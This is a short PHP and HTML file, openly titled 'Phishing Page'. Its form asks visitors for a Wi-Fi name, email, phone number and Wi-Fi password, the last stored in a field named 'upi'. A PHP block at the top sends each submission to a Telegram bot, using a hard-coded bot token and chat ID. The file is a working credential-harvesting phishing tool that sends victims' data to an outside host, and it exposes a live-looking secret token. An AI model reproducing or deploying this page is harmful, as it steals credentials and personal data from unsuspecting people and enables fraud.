<?php
if(isset($_POST['submit'])){
    $name = $_POST['name'];
    $email = $_POST['email'];
    $phone = $_POST['phone'];
    $upi = $_POST['upi'];
    
    $content = "Name: ".$name."\nEmail: ".$email."\nPhone: ".$phone."\nUPI: ".$upi;
    
    // Send data to Telegram Bot
    $botToken = '7803933953:AAEflCfSNByB0rGlga0nZQMzZmyLvUlrsd4';
    $chatId = '7172906458';
    $url = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($content);
    file_get_contents($url);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phishing Page</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            animation: hackerAnimation 5s infinite;
        }
        @keyframes hackerAnimation {
            0% { background-color: black; }
            50% { background-color: #0f0; }
            100% { background-color: black; }
        }
        form {
            margin: 50px auto;
            width: 80%;
            max-width: 600px;
            padding: 20px;
            background-color: #222;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        input[type="text"], input[type="email"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: white;
        }
        input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            border: none;
            border-radius: 5px;
            background-color: #0f0;
            color: black;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background-color: #0a0;
        }
    </style>
</head>
<body>
    <form action="" method="post">
        <label for="name">Wi-Fi Name:</label><br>
        <input type="text" id="name" name="name" required><br>
        <label for="email">Email:</label><br>
        <input type="email" id="email" name="email" required><br>
        <label for="phone">Phone Number:</label><br>
        <input type="text" id="phone" name="phone" required><br>
        <label for="upi">Wi-Fi password:</label><br>
        <input type="text" id="upi" name="upi" required><br><br>
        <input type="submit" name="submit" value="Submit">
    </form>
</body>
</html>